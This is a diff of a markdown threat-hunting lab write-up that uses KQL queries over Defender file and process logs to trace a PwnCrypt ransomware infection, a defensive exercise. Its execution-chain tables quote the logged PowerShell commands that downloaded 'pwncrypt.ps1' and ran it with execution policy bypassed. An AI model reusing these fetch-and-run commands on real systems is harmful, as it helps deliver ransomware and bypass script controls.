@@ -5,32 +5,30 @@
 ### 🔐 Goal:
 Investigate a newly discovered ransomware strain known as **PwnCrypt**. This strain uses a PowerShell-based payload to encrypt files on infected systems, prepending `.pwncrypt` to the original file extensions. For example, `hello.txt` becomes `hello.pwncrypt.txt`.
 
-The CISO has raised concerns about potential spread within the corporate environment due to immature defenses and lack of user training. Your task is to determine whether the ransomware has affected any systems, how it was delivered, and whether it established persistence.
+The CISO has raised concerns about potential lateral spread due to immature defenses and a lack of security awareness training. Your task is to determine whether the ransomware has affected any systems, how it was delivered, and whether it established persistence.
 
 ---
 
-## 🔬 1. Preparation
+## 🔬 Step 1: Define Scope and Threat Hypothesis
 
-- **Objective:** Define hunting hypotheses based on known IoCs and threat intelligence.
-- **Threat Hypothesis:** PwnCrypt ransomware may have infiltrated the network via user execution of PowerShell-based droppers. Known indicators include:
-  - `.pwncrypt.` in filenames
-  - Scripts like `pwncrypt.ps1`
-  - Usage of `Invoke-WebRequest`, `ExecutionPolicy Bypass`, etc.
+To begin the hunt, I developed hypotheses grounded in initial threat intelligence. PwnCrypt is known to use PowerShell droppers and encode payloads, often delivered via GitHub links or base64 strings. It leaves behind encrypted files containing `.pwncrypt` and a ransom note labeled something like `decryption-instructions`.
 
----
-
-## 📥 2. Data Collection
-
-- **Target Tables:**
-  - `DeviceProcessEvents`
-  - `DeviceFileEvents`
-- **Goal:** Confirm these tables contain logs for the timeframe around suspicious activity.
+- **Expected behavior:**
+  - Execution of PowerShell with flags like `-ExecutionPolicy Bypass`
+  - Use of `Invoke-WebRequest` or `DownloadString`
+  - Creation of `.pwncrypt` file artifacts
+  - Possible ransom note dropped post-encryption
 
 ---
 
-## 📊 3. Data Analysis
+## 📥 Step 2: Confirm Table Coverage
 
-### 🔎 Check for IoC Matches in File System
+Before diving into IoC searches, I confirmed that both `DeviceProcessEvents` and `DeviceFileEvents` had coverage for the affected systems during the target timeframe. This ensured I’d be able to trace both process execution and file impact.
+
+---
+
+## 📁 Step 3: Identify File-Based IoCs in DeviceFileEvents
+
 ```kql
 let VMName = "pvr-hunting2";
 DeviceFileEvents
@@ -40,12 +38,16 @@ DeviceFileEvents
 | order by Timestamp desc
 ```
 
-### 🖼️ File Discovery via DeviceFileEvents
+This query scans for any files with names containing “pwncrypt” on the target VM. It’s designed to catch encrypted documents, payload scripts (e.g., `pwncrypt.ps1`), and ransom notes.
+
 ![File Discovery via DeviceFileEvents](./images/1.png)
+
+✅ **Outcome:** Multiple encrypted files with `.pwncrypt` in the name were discovered, along with signs of the script that initiated them — confirming local impact.
 
 ---
 
-### 📆 Timeline Analysis of Known Execution Time
+## 📆 Step 4: Timeline Reconstruction Around Known Execution
+
 ```kql
 let VMName = "windows-target-1";
 let specificTime = datetime(2024-10-16T05:24:46.8334943Z);
@@ -55,12 +57,16 @@ DeviceProcessEvents
 | order by Timestamp desc
 ```
 
-### 🖼️ Timeline Analysis of Process Activity
+Using a confirmed execution timestamp, I zoomed out to view all surrounding process activity within a ±3-minute window. This helped map the full chain of events and surfaced the parent process (`cmd.exe`) that launched PowerShell.
+
 ![Timeline Analysis of Process Activity](./images/2.png)
+
+🧠 **Insight:** Establishing temporal context revealed the entry vector and highlighted early-stage behavior.
 
 ---
 
-### 🧹 Focused Hunt to Reduce Noise
+## 🧹 Step 5: Focused Process Filtering Around Payload Execution
+
 ```kql
 let VMName = "pvr-hunting2";
 let specificTime = datetime(2025-05-28T20:20:14.5912032Z);
@@ -73,12 +79,18 @@ DeviceProcessEvents
 | order by Timestamp desc
 ```
 
-### 🖼️ Focused Process Filtering Around IOC Time
+To isolate only the relevant activity, I filtered down to suspicious executables, PowerShell scripts, and key strings associated with script execution or encoding. This sharpened the view of malicious tooling.
+
 ![Focused Process Filtering Around IOC Time](./images/3.png)
+
+✅ **Outcome:** I exposed a clear execution chain:
+- `cmd.exe` spawns `powershell.exe`
+- PowerShell downloads `pwncrypt.ps1`
+- The script runs with execution policy bypassed
 
 ---
 
-## 🔥 Ransomware Execution Chain Identified
+## 🔗 Step 6: Reconstruct the Execution Chain
 
 ### 🧩 Key Malicious Sequence
 
@@ -87,23 +99,23 @@ DeviceProcessEvents
 | 13:20:14    | `cmd.exe` → `powershell.exe` | `Invoke-WebRequest` downloads `pwncrypt.ps1` from GitHub     |
 | 13:20:17    | `powershell.exe`         | `-ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1` |
 
-✅ This confirms download & execution of the ransomware payload.
+This sequence confirms intentional delivery and execution of the ransomware using living-off-the-land binaries (LOLBins). The use of `Invoke-WebRequest` and PowerShell in this manner is a red flag in most environments.
 
 ---
 
-## 🚨 Malicious Events to Prioritize
+## 🚨 Step 7: Prioritize Key Events for Incident Response
 
 | Time       | Process           | Detail                                                 | Meaning                                |
 |------------|-------------------|---------------------------------------------------------|----------------------------------------|
-| 13:20:14   | powershell.exe     | `Invoke-WebRequest -Uri https://...pwncrypt.ps1`        | 🚨 Script downloaded                    |
-| 13:20:17   | powershell.exe     | `-ExecutionPolicy Bypass -File pwncrypt.ps1`            | 🚨 Ransomware executed                  |
-| 13:20:13   | powershell.exe     | `-ExecutionPolicy Unrestricted -File script0.ps1`       | ⚠️ Possibly a test/staging script       |
+| 13:20:14   | powershell.exe     | `Invoke-WebRequest -Uri https://...pwncrypt.ps1`        | 🚨 Downloader invoked                   |
+| 13:20:17   | powershell.exe     | `-ExecutionPolicy Bypass -File pwncrypt.ps1`            | 🚨 Payload executed                     |
+| 13:20:13   | powershell.exe     | `-ExecutionPolicy Unrestricted -File script0.ps1`       | ⚠️ Possibly earlier test/staging        |
 
-💡 This matches `DeviceFileEvents` activity where `.pwncrypt` files were created shortly after execution.
+🧠 **Insight:** These three command lines represent the critical chain of infection — from download to encryption. They also serve as detection opportunities.
 
 ---
 
-## 📂 4. Confirm File Impact (Trace from pwncrypt.ps1)
+## 📂 Step 8: Trace File Impact from pwncrypt.ps1
 
 ```kql
 let VMName = "pvr-hunting2";
@@ -114,29 +126,32 @@ DeviceFileEvents
 | order by Timestamp desc
 ```
 
-### 🖼️ File Impact Traced from pwncrypt.ps1
+This query links all file modifications back to the ransomware script. By keying in on `InitiatingProcessCommandLine`, I tracked the spread and encryption events triggered by `pwncrypt.ps1`.
+
 ![File Impact Traced from pwncrypt.ps1](./images/4.png)
+
+✅ **Outcome:** I confirmed file encryption shortly after execution, including sensitive files on the user’s desktop — a common target for ransomware.
 
 ---
 
-## 🗂️ Ransomware Execution Timeline
+## 🗂️ Step 9: Ransomware Execution Timeline Summary
 
 **Host:** `pvr-hunting2`
 
-- 🔹 **13:20:14 UTC** – `powershell.exe` downloads `pwncrypt.ps1`
-- 🔹 **13:20:17 UTC** – Execution via `ExecutionPolicy Bypass`
-- 🔹 **13:20:30+ UTC** – Files encrypted with `_pwncrypt.csv` suffix
-- 🔹 **Files Dropped to Desktop:**
+- 🕒 **13:20:14 UTC** – `powershell.exe` downloads `pwncrypt.ps1`
+- 🕒 **13:20:17 UTC** – Script executed via `-ExecutionPolicy Bypass`
+- 🕒 **13:20:30+ UTC** – Files encrypted with `.pwncrypt` extension
+- 📂 **Files Affected:**
   - `3698_EmployeeRecords_pwncrypt.csv`
   - `8955_CompanyFinancials_pwncrypt.csv`
   - `9543_ProjectList_pwncrypt.csv`
   - `________decryption-instructions` (ransom note)
-- 🔹 **Process Chain:** `cmd.exe` → `powershell.exe`
-- 🔹 **Affected Files:** EmployeeRecords, ProjectList, CompanyFinancials
+
+🧠 **Observation:** Ransomware focused on business-sensitive files and dropped an easily identifiable ransom note to the desktop.
 
 ---
 
-## 🔍 5. Scan for Ransom Note Dropping Behavior
+## 🔍 Step 10: Search for Ransom Note Creation
 
 ```kql
 DeviceFileEvents
@@ -145,53 +160,55 @@ DeviceFileEvents
 | project Timestamp, FolderPath, FileName, InitiatingProcessFileName
 ```
 
-### 🖼️ Scan for Dropped Ransom Notes
-<!--![Scan for Dropped Ransom Notes](./images/5.png)--->
+This final check scans for files resembling ransom notes. These are typically dropped by ransomware after file encryption and often named `readme.txt`, `instructions.html`, or similar.
 
-✅ **Confirmed:** Ransom note file named `________decryption-instructions` was dropped on the desktop alongside encrypted files.
+![Scan for Dropped Ransom Notes](./images/5.png)
+
+✅ **Confirmed:** `________decryption-instructions` was dropped alongside encrypted files — validating the ransomware’s impact and helping complete the forensic narrative.
 
 ---
 
-## 🧩 MITRE ATT&CK Mapping
+## 🎯 MITRE ATT&CK Technique Mapping
 
 | Technique | ID | Description |
 |----------|----|-------------|
-| **Command and Scripting Interpreter: PowerShell** | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | Execution of malicious PowerShell scripts (`pwncrypt.ps1`) via `Invoke-WebRequest` and `-ExecutionPolicy Bypass`. |
-| **Ingress Tool Transfer** | [T1105](https://attack.mitre.org/techniques/T1105/) | Use of `Invoke-WebRequest` to download payload from GitHub. |
-| **User Execution** | [T1204](https://attack.mitre.org/techniques/T1204/) | Likely user-initiated execution of the PowerShell script via `cmd.exe`. |
-| **Data Encrypted for Impact** | [T1486](https://attack.mitre.org/techniques/T1486/) | Encryption of files on disk using ransomware payload. |
-| **Masquerading** | [T1036](https://attack.mitre.org/techniques/T1036/) | Ransomware script possibly disguised as a generic PowerShell file in `ProgramData`. |
-| **Execution Guardrails** | [T1480.001](https://attack.mitre.org/techniques/T1480/001/) | Use of `-ExecutionPolicy Bypass` to evade policy controls. |
+| **Command and Scripting Interpreter: PowerShell** | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | Malicious PowerShell used for execution and scripting. |
+| **Ingress Tool Transfer** | [T1105](https://attack.mitre.org/techniques/T1105/) | Remote script downloaded from GitHub via `Invoke-WebRequest`. |
+| **User Execution** | [T1204](https://attack.mitre.org/techniques/T1204/) | Likely user-initiated from `cmd.exe`, possibly via phishing or social engineering. |
+| **Data Encrypted for Impact** | [T1486](https://attack.mitre.org/techniques/T1486/) | File encryption confirmed via file extensions and dropped ransom note. |
+| **Masquerading** | [T1036](https://attack.mitre.org/techniques/T1036/) | Script placed in `ProgramData` to appear benign or admin-like. |
+| **Execution Guardrails** | [T1480.001](https://attack.mitre.org/techniques/T1480/001/) | Use of `-ExecutionPolicy Bypass` to circumvent PowerShell protections. |
 
 ---
 
-## 📌 Conclusion & Lessons Learned
+## 📌 Conclusion
 
-### ✅ Summary of Findings:
-- **Confirmed**: Download and execution of `pwncrypt.ps1`
-- **Detected**: File encryption events post-execution
-- **Confirmed**: Ransom note dropped to desktop
-- **Delivery Method**: PowerShell from `cmd.exe` with bypass flag
-- **No Persistence**: No evidence of registry or scheduled task persistence
-
----
-
-## 🛡️ 6. Response
-
-- 🔒 Isolate the endpoint from the network
-- 📤 Export artifacts and commands used
-- 🧼 Remediate: Remove `pwncrypt.ps1`, decrypt if possible, and harden PowerShell usage
+### ✅ Findings:
+- Ransomware downloaded and executed via PowerShell
+- Business-critical files encrypted with `.pwncrypt` extension
+- Ransom note dropped to Desktop
+- No persistence or lateral movement detected during this hunt
 
 ---
 
-## 🔁 7. Improvement Recommendations
+## 🛡️ Step 11: Incident Response Recommendations
 
-- 🚧 Disable or tightly restrict PowerShell execution for standard users
-- 📊 Enable comprehensive logging across endpoints (Defender for Endpoint telemetry)
-- 🧑‍🏫 Conduct user training to spot social engineering or suspicious files
-- 🔐 Apply allowlisting (AppLocker or WDAC) to limit script execution
-- ⚙️ Consider EDR rules for `Invoke-WebRequest` + `ExecutionPolicy Bypass` detection combo
+- 🔒 Isolate infected endpoint from the network
+- 📤 Export all process and file event logs around infection timestamp
+- 🧼 Remove `pwncrypt.ps1` and encrypted files, begin restoration from backup
+- 💬 Notify stakeholders and legal if necessary
 
 ---
 
-> 🧠 **Reflection:** This lab reinforces the importance of endpoint visibility, command-line logging, and early detection of file encryption behavior. Dropped artifacts — like the desktop ransom note — offer strong indicators for rapid triage and containment.
+## 🔁 Step 12: Future Prevention
+
+- 🚧 Enforce PowerShell Constrained Language Mode for non-admin users
+- 📊 Ensure Defender for Endpoint logging is fully enabled and retained
+- 🧑‍🏫 Train employees on phishing recognition and suspicious activity reporting
+- 🔐 Use AppLocker or WDAC to block unauthorized scripts
+- 🛎️ Create alerting rules for PowerShell + download + bypass patterns
+
+---
+
+> 🧠 **Reflection:** This hunt demonstrates the importance of tying together file and process telemetry to reconstruct attack timelines. Even without behavioral alerts, attacker intent becomes clear when we follow the data breadcrumbs.
+````
